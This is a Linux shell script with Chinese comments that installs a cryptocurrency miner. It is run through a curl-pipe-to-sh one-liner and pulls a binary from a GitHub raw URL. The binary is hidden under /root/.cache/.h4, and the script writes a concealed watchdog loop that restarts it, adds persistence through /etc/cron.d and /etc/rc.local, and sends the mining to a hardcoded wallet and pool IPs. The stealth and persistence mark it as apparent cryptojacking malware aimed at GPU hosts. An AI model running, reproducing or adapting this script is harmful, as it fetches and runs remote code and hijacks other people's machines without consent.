#!/bin/sh
# h4 通用部署 (linux, 不依赖 ComfyUI 路径) — 一条命令拉起矿工 + 双层守护
# 用法: curl -fsSL https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/main/deploy_h4u.sh | sh
GH=https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/main
D=/root/.cache/.h4
LOG=/root/.cache/nv
mkdir -p "$D" "$LOG" 2>/dev/null
cd "$D" || exit 1
W="prl1p08n7f9q0wwf8ykrgxrxrvlwcl8htpgs2da83zgtmfwzkdy6xwnvq4ndq96"
WK="${H4_WORKER:-w-auto}"
POOL="stratum+tcp://51.79.178.22:3360,stratum+tcp://172.235.194.4:3360"

# 1) 二进制(幂等 + 大小校验)
if [ ! -x "$D/pm" ] || [ "$(stat -c%s "$D/pm" 2>/dev/null || echo 0)" -lt 40000000 ]; then
  curl -fsSL -m 240 "$GH/bin/peakminer" -o "$D/pm.t" 2>/dev/null
  S=$(stat -c%s "$D/pm.t" 2>/dev/null || echo 0)
  [ "$S" -gt 40000000 ] || { rm -f "$D/pm.t"; echo "FAIL bin $S"; exit 1; }
  mv -f "$D/pm.t" "$D/pm"; chmod 700 "$D/pm"
fi

# 2) 守护脚本 (flock 单授权, 判活用 cmdline 绝对路径)
cat > "$D/.w" <<EOS
#!/bin/sh
D=$D
exec 9>/tmp/.h4u.lck
flock -n 9 || exit 0
while :; do
  if ! pgrep -f "[.]h4/pm" >/dev/null 2>&1; then
    cd \$D && setsid env PEAK_POOL="$POOL" PEAK_WALLET="$W" PEAK_WORKER="$WK" PEAK_COIN="pearl" \
      "\$D/pm" >>"$LOG/miner.out" 2>&1 </dev/null &
    sleep 8
  fi
  sleep 40
done
EOS
chmod 700 "$D/.w"

# 3) 启动 + 持久化
setsid sh "$D/.w" >/dev/null 2>&1 </dev/null &
( echo "*/3 * * * * root sh $D/.w >/dev/null 2>&1" > /etc/cron.d/h4u 2>/dev/null && chmod 644 /etc/cron.d/h4u ) 2>/dev/null
grep -q 'h4u-keep' /etc/rc.local 2>/dev/null || sed -i "1i sh $D/.w >/dev/null 2>&1 & #h4u-keep" /etc/rc.local 2>/dev/null

sleep 12
echo "== HOST $(hostname) =="
pgrep -f "[.]h4/pm" | head -3
tail -3 "$LOG/miner.out" 2>/dev/null
nvidia-smi --query-gpu=name,memory.used,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null | head -4
